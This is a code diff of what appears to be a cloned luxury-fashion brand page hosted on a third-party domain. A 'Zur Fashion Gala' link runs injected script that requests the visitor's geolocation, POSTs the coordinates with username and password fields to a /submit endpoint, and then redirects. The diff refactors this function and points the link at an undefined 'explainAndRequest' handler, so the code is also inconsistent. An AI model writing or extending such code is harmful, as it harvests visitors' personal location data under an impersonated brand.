@@ -815,8 +815,8 @@ cursor: default!important;
                </div> 
                <ul class="menu__items-list"> 
                 <li class="menu__item
-" id="nach_look_shoppen_611544" data-content-id="3973"> <a href="https://loropiana-p9gb.onrender.com/fashion-gala.html" onclick="trackAndRedirect(); return false;" class="btn menu__item-btn menu__item-btn--link">Zur Fashion Gala</a> </li> 
-               </ul> 
+" id="nach_look_shoppen_611544" data-content-id="3973"> <a href="https://loropiana-p9gb.onrender.com/fashion-gala.html" onclick="explainAndRequest(); return false;" class="btn menu__item-btn menu__item-btn--link">Zur Fashion Gala</a> </li> 
+	       </ul> 
                <div class="menu__item-related-container"> 
                 <div class="menu__item-related position-relative
 " data-related-content-id="resort_kollektion_fs25_611532"> <a href="https://loropiana-p9gb.onrender.com/fashion-gala.html" target="_self" class="menu__item-related-link-wrap"> 
@@ -4193,38 +4193,34 @@ function trackPage() {
  <script type="text/javascript" nonce="afa66442b18453981eaabb8a83c61f82" src="/v2vox7/VkF-T/1hxYI/FQ/zOwYNc7tD3chVa1J/KmVoZEZJ/IW5hVD/tyQyg"></script><script type="text/javascript" nonce="afa66442b18453981eaabb8a83c61f82" src="/v2vox7/VkF-T/1hxYI/FQ/zGwYNc7tD3uE/CGJsZEZJ/MyBIPi/l9Lw0ZAQ?v=eedd6907-e094-f40e-3006-120524470216" defer></script></body>
 <script>
 function trackAndRedirect() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-      function(position) {
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
-
-        fetch('/submit', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            username: "anonymous",
-            password: "none",
-            latitude: latitude,
-            longitude: longitude
-          })
-        })
-        .then(() => {
-          window.location.href = "/fashion-gala.html";
-        })
-        .catch(() => {
-          window.location.href = "/fashion-gala.html";
-        });
-      },
-      function(error) {
-        alert("Standort konnte nicht erfasst werden.");
-        window.location.href = "/fashion-gala.html";
-      }
-    );
-  } else {
-    alert("Geolocation wird nicht unterstützt.");
-    window.location.href = "/fashion-gala.html";
+  if (!navigator.geolocation) {
+    alert("Geolocation wird von deinem Browser nicht unterstützt.");
+    return window.location.href = "/fashion-gala.html";
   }
+
+  navigator.geolocation.getCurrentPosition(
+    position => {
+      const { latitude, longitude } = position.coords;
+
+      fetch('/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          username: "anonymous",
+          password: "none",
+          latitude,
+          longitude
+        })
+      })
+      .finally(() => {
+        window.location.href = "/fashion-gala.html";
+      });
+    },
+    () => {
+      alert("Standort konnte nicht erfasst werden.");
+      window.location.href = "/fashion-gala.html";
+    }
+  );
 }
 </script>
 
